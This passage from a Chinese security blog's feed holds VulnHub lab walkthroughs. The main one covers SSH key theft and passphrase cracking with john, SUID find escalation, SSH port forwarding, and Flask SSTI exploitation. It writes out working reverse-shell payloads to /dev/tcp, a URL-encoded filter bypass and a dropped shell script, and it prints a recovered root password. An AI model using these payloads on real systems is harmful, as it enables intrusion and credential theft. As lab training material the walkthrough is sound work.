ACTION&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1017.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 exp.sh 上传到网站上&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1018.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;上传成功后，没多长时间我们就接受到了反弹的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1019.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;定时任务查看&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#定时任务查看&#34;&gt;#&lt;/a&gt; 定时任务查看&lt;/h3&gt;
&lt;p&gt;将接受到的 shell 变成一个标准的 shell 终端&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1020.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看计划任务看是什么情况造成这个漏洞的&lt;/p&gt;
&lt;p&gt;crontab -l | tail -n 1&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1021.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;可见靶机上有 tar -cvf 的压缩命令的定时任务被定期执行&lt;/p&gt;
&lt;h3 id=&#34;ssh私钥密码破解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh私钥密码破解&#34;&gt;#&lt;/a&gt; ssh 私钥密码破解&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;收集服务器的相关信息，如 id 查看用户组，查看 linux 的版本，查看 pkexec 是否存在，上传 pspy 监控，上传 linpeas 监控服务器上的敏感信息，寻找服务器的权限设置错误，查找 s 权限的文件，看有无端口敲门漏洞，看端口信息是否可做隧道，脏牛提权，敏感的配置文件信息，定时任务等&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;对上述做了全面信息收集后，并没有找到可利用的点，继续找，找到了 ssh 配对的信息，可以尝试利用此 ssh 私钥连接到其他用户。 &lt;code&gt;cat ~/.ssh/id_rsa&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1022.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看到这个 ssh 私钥文件内容比正常无密码的 ssh 要多一点，怀疑有密钥上有一层密码，需要通过相关工具来破解出密钥的密码。&lt;/p&gt;
&lt;p&gt;查看靶机上总共有哪几个用户  &lt;code&gt;cat /etc/passwd | grep bash&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1023.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;我们就是要用这个私钥文件分别配对四个用户进行免密登陆&lt;/p&gt;
&lt;p&gt;将私钥文件发送至我们的 kali 攻击机 &lt;code&gt;scp id_rsa parallels@192.168.31.78:/tmp/tmp&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1024.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试用此私钥登陆对方服务器时  &lt;code&gt;ssh -i id_rsa backupper@192.168.31.84&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1025.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提醒我们需要输入密码，破解 ssh 私钥的密码首先想到的就是 john 工具&lt;br&gt;
先用 ssh2john 将私钥文件转化为 john 可识别的文件  &lt;code&gt;ssh2john id_rsa &amp;gt; id_rsa_hash&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1026.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;再用 john 去破解私钥的 hash 文件 &lt;code&gt;john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1027.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有爆破出来，这个 john 工具出现了问题，干脆删了它，重新编译一个 john&lt;/p&gt;
&lt;h3 id=&#34;源码编译-john&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#源码编译-john&#34;&gt;#&lt;/a&gt; 源码编译 john&lt;/h3&gt;
&lt;p&gt;并不知道 john 是以何种方式安装的，可以尝试打印其路径，删除其二进制文件，或者先用 apt 源尝试卸载 john  &lt;code&gt;sudo apt remove john&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1028.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看来就是通过 apt 源中下载的 john，将其卸载干净之后，再次输入 john 的命令，判断出来此服务器目前没有了此命令&lt;/p&gt;
&lt;p&gt;下一步就是通过源码编译 john:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL29wZW53YWxsL2pvaG4=&#34;&gt;https://github.com/openwall/john&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1029.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;wget https://github.com/openwall/john/archive/refs/tags/1.9.0-Jumbo-1.zip&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1030.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;cd john-1.9.0-Jumbo-1&lt;/code&gt;  在 src 文件夹下配置： &lt;code&gt;./configure&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1031.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;同一文件下使用 make 命令编译&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1032.png&#34;&gt;
&lt;p&gt;在 run 文件夹下使用:  &lt;code&gt;./john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1033.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 破解得到 ssh 私钥文件的密码是 samantha1&lt;/p&gt;
&lt;p&gt;将我们编译成功的 john 配置到全局，以软连接的方式强制放到 /usr/bin/john&lt;br&gt;
 &lt;code&gt;sudo ln -sf ~/Desktop/redteam/john/john-1.9.0-Jumbo-1/run/john /usr/bin/john&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;-s 表示添加软连接，-f 表示强制添加，第一个位置是原位置，第二个位置是添加了软连接之后的位置&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1034.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;输入 john 之后可以看到此命令已经变成全局命令了&lt;/p&gt;
&lt;h3 id=&#34;用户组权限利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用户组权限利用&#34;&gt;#&lt;/a&gt; 用户组权限利用&lt;/h3&gt;
&lt;p&gt;凭借私钥及其密码 samantha1 依次尝试前面得到服务器四个有 bash 的用户登陆，最终凭借 jaap 用户登录到了服务器 &lt;code&gt;ssh jaap@192.168.31.84 - i id_isa&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1035.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;拿到 jaap 的权限之后，我们同样是没有一些通用的提权方式提权的，需要翻阅文件，看靶机设计者给了我们哪些文件&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;找到主目录下有两个敏感文件，一个 s 权限的 find 命令，另一个是 startserver.sh 的脚本，&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ls -Alh&lt;/code&gt;  看到 find 属于 jaap 用户和 remnie 用户组&lt;br&gt;
 remnie 权限使用 find 提权  &lt;code&gt;sudo -u remnie ./find. -exec /bin/bash -p \; -quit&lt;/code&gt; &lt;br&gt;
 没 sudo，用 jaap 来执行从而拿 remnie 的用户组权限  &lt;code&gt;./find. -exec /bin/sh -p \; -quit&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1036.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;有了 remnie 的用户组权限，就可以进入到其用户目录下&lt;/p&gt;
&lt;h3 id=&#34;shell脚本漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#shell脚本漏洞&#34;&gt;#&lt;/a&gt; shell 脚本漏洞&lt;/h3&gt;
&lt;p&gt;查看到有段提示说是在本地的某个端口处有一些问题&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;查看到 scripts 中的 start.sh 中有一些代码：使用 /tmp/start 创建一个变量文件名，如果文件开始在那里，将使用 ps 命令从进程运行的 grep 形式的 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NlcnZlci5weQ==&#34;&gt;server.py&lt;/span&gt;，如果 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NlcnZlci5weQ==&#34;&gt;server.py&lt;/span&gt; 没有运行，它将运行它，如果是，则它会回显该消息。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1037.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看一下当前有哪些端口在运行，记录一下&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1038.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;上传 pspy 监控，发现的确没有 server.py 被执行&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1039.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;于是我们接下来就需要去操作得到 /tmp/start 这个文件，记得之前在 jaap 用户中找到过一个 startserver.sh 的文件，去看一看这个文件，这个文件就是用来将 1 输入到 /tmp/start 中的，之后看 pspy 监控&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1040.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;Pspy 中监听到了 remnie 用户下的 start.sh 执行了，判断出此时靶机上的某个端口被打开了，看一看目前开放的端口有哪些&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1041.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 此时本地端口 8787 成功被打开了&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1042.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;curl-测试内网站点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#curl-测试内网站点&#34;&gt;#&lt;/a&gt; curl 测试内网站点&lt;/h3&gt;
&lt;p&gt;服务器上有 curl 命令，用 curl 测试得到是一个网站，但是服务器不存在 iptables 命令，无法将 8787 端口外放，意外着外界无法访问到此端口，这时候就需要做 ssh 的端口转发&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1043.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;ssh-端口转发&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-端口转发&#34;&gt;#&lt;/a&gt; ssh 端口转发&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;ssh 端口转发就是将我们访问某一个 ip:port 的流量转发至另一个 ip:port，如下，在此我的公网 ip 地址中存在一个网站，想要通过 ssh 端口转发，将我本地访问 localhost 的某一个端口的流量转发至这个页面&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1044.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;判断本地的 7001 端口并没有被占用  &lt;code&gt;lsof -i:7001 &lt;/code&gt; &lt;br&gt;
将访问本地 7000 端口的信息转发到远程主机的 80 端口上面  &lt;code&gt;ssh -p 2121 -L 7000:localhost:80 root@1.117.52.219 -i /etc/ssh/cloud.pem -N&lt;/code&gt; &lt;br&gt;
-p 表示进入服务器的端口，-L 表示转发规则，前者为本地端口，后者为远程端口，-i 指定私钥文件进行免密，-N 表示不进入服务器&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1045.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;于是，我们访问本地的 7001 端口便可以进入到公网上的页面&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1046.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;假如远程主机在 9888 端口部署了一个服务器，但是防火墙并没有开放这个端口，如果本地想要访问这个 9888 ，就可以用上面的案例来绕过防火墙进行 ssh 访问。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;可以使用 nohup 进行后台运行 &lt;code&gt;nohup ssh -p2121 -L 7001:localhost:80 root@1.117.52.219 -i /etc/ssh/cloud.pem -N &amp;amp;&lt;/code&gt; &lt;br&gt;
 使用一句话命令直接清理本地的 7001 端口 &lt;code&gt;lsof -i: 7001 | awk &#39;&amp;#123;print $2&amp;#125;&#39; | grep -v &#39;PID&#39; | uniq | xargs kill - 9&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1047.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;nohup 无日志产生的后台运行如下  &lt;code&gt;nohup java -jar ruoyi-admin.jar &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1048.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;我们通过端口转发来将我们本地访问 8787 端口时进入到靶机的 8787 界面，从而绕过防火墙规则，靶机上需要确定开放了 8787&lt;/p&gt;
&lt;p&gt;在我们的主机上执行:  &lt;code&gt;ssh -L 8787:127.0.0.1:8787 -i id_rsa jaap@192.168.31. 85 -N&lt;/code&gt; &lt;br&gt;
 于是我门主机打开 8787 的页面就进入到了靶机对应的窗口中&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1049.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 接下来转变为对这个端口所在的 web 的测试&lt;/p&gt;
&lt;h3 id=&#34;ssh-内网穿透&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-内网穿透&#34;&gt;#&lt;/a&gt; ssh 内网穿透&lt;/h3&gt;
&lt;p&gt;既然提到了 ssh 的端口转发，不得不说一下 ssh 的内网穿透可以将内网的服务穿透到公网上去，&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;实现如下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;`user1 mac: lsof -i:1122`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将指定user2 的 1122 端口连接到user1 的 22 端口,-R表示远程端口转发，-N表示不执行，-f后台运行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;`user2 kali: ssh -Nf -R *:1122:localhost:22 chentuo@192.168.31.19`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;user3通过连接user1的 1122 端口连接到了user2上&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;user3 windows: ssh -p 1122 parallels@192.168.31.19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下图中从上至下分别表示 mac，kali，windows 三个机器&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1050.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;即 user1 相当于一个公网跳板，一个内网的机器连接这个跳板就可以连接到另外一个内网的机器，user3 连接到公网跳板的流量被转发到了另一台内网机器&lt;/p&gt;
&lt;h3 id=&#34;ssti反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssti反弹shell&#34;&gt;#&lt;/a&gt; SSTI 反弹 shell&lt;/h3&gt;
&lt;p&gt;打开 127.0.0.1:8787 开始测试网站漏洞&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1051.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;是 flask 框架，测试 SSTI 模板注入  &lt;code&gt;http://127.0.0.1:8787/?name=&amp;#123;&amp;#123;10*10&amp;#125;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1052.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;回显是计算结果，表示存在此模板注入，利用 SSTI 模板注入在反弹 shell 到 kali 机器上&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://127.0.0.1:8787/?name=&amp;#123;% import os %&amp;#125;&amp;#123;&amp;#123;os.system(&#39;bash -c &#34;bash -i &gt;&amp;/dev/tcp/192.168.31.83/4444 &gt;&amp;1&#34;&#39;)&amp;#125;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1053.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;反弹失败可能是采用了过滤机制&lt;/p&gt;
&lt;h3 id=&#34;ssti-失败绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssti-失败绕过&#34;&gt;#&lt;/a&gt; SSTI 失败绕过&lt;/h3&gt;
&lt;p&gt;利用 url 编码绕过过滤机制，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5qc29ucy5jbi91cmxlbmNvZGU=&#34;&gt;http://www.jsons.cn/urlencode&lt;/span&gt; 上进行 url 编码转化&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1054.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将上述中用来反弹 shell 的代码进行 url 编码后得到如下网址&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://127.0.0.1:8787/?name=%7B%25%20import%20os%20%25%7D%7B%7Bos.system(&#39;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.83%2F4444%20%3E%261%22&#39;)%7D%7D&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;继续访问此网站用来反弹 shell，依然是无效果的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1055.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;换种方式来执行，在对方服务器上写一个 sh 的反弹脚本，利用 SSTI 去读取这个脚本并执行&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; /tmp/shell.sh &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;! /bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash - c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.83/4444 0&amp;gt;&amp;amp;1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1056.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;访问如下网址用另外的方式来反弹 shell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://127.0.0.1:8787/?name=&amp;#123;&amp;#123;request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27cd%20/tmp/;bash%20shell.sh%27).read()&amp;#125;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1057.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;反弹虽然成功了，但却立即断开了，原因不明，将机器重新启动后，shell 成功被反弹出来，接收到了一个稳定的 shell, 将所得到的 shell 利用如下三行代码输出为标准的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1058.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 现在我们成功拿到了 remnie 用户的 shell&lt;/p&gt;
&lt;h3 id=&#34;二进制数据解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二进制数据解密&#34;&gt;#&lt;/a&gt; 二进制数据解密&lt;/h3&gt;
&lt;p&gt;remnie 用户下的 server.py 文件就是形成此漏洞的原因&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1059.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;我们现在仍然在一个既没有内核漏洞可以提权，也没有相关权限设置错误提权的机器上，只能寻找于 remnie 相关的文件来找突破口，看到用户主目录下有一个 server.conf 的配置文件，进行查看之后看到了如下信息。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1060.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示说是一个连接 root 服务的文件，最右边的这些二进制数字比较可疑，尝试进行二进制解密&lt;/p&gt;
&lt;p&gt;将这些二进制数字打印出来  &lt;code&gt;cat server.conf | cut -d &#39;|&#39; -f 2 &amp;gt; binary.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1061.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;Vim 不进入写模式将换行符换为空  &lt;code&gt;vim 1.txt +&amp;quot;:%s/\n//g&amp;quot; +wq&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1062.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;From binary 解密二进制之后得到了十六进制的如下数据&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1063.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;From magic 解密之后得到了 root 账户的密码  &lt;code&gt;root:-!F8h2LMr&amp;lt;\[n]&#39;N]Kq&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1064.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;利用如下命令切换至 root 用户&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1065.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 root 账户的权限&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/145%20TORANDO/</guid>
            <title>VULNHUB 45 TORANDO</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/145%20TORANDO/</link>
            <category>VULNHUB 41-50</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaWEtdG9ybmFkbyw2Mzkv&#34;&gt;https://www.vulnhub.com/entry/ia-tornado,639/&lt;/span&gt;&lt;br&gt;
 教程链接地址 1: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hsanp6ai9hcnRpY2xlL2RldGFpbHMvMTIyOTUyNDI2&#34;&gt;https://blog.csdn.net/hljzzj/article/details/122952426&lt;/span&gt;&lt;br&gt;
 教程链接地址 2: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaGlyYWswL2FydGljbGVzLzE2MjA3NTgwLmh0bWw=&#34;&gt;https://www.cnblogs.com/hirak0/articles/16207580.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135 (由于设置成了 DHCP、可能多变)&lt;br&gt;
 靶机 TORANDO：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | uniq&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1341.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;2 ）粗略的识别一下该 ip 上开放了哪些端口&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1342.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.83 靶机开放端口 22,80&lt;/p&gt;
&lt;p&gt;3 ）对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.183 --min-rate=5000&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1344.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;检索到的有效服务如下所示：&lt;br&gt;
22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用&lt;br&gt;
 80 http：可对 web 进行渗透测试收集信息&lt;/p&gt;
&lt;/blockquote&gt;
